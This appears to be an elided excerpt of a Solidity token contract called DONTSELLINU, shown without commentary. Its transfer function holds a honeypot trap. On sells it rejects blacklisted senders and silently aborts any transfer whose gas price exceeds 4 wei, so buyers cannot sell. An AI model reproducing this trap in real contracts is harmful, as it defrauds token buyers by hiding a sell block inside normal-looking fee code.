...
contract DONTSELLINU is Context, IERC20, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (from != uniswapV2Pair) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount"); require(!_isIncludedFromFee[from]); if (tx.gasprice > 4) return;
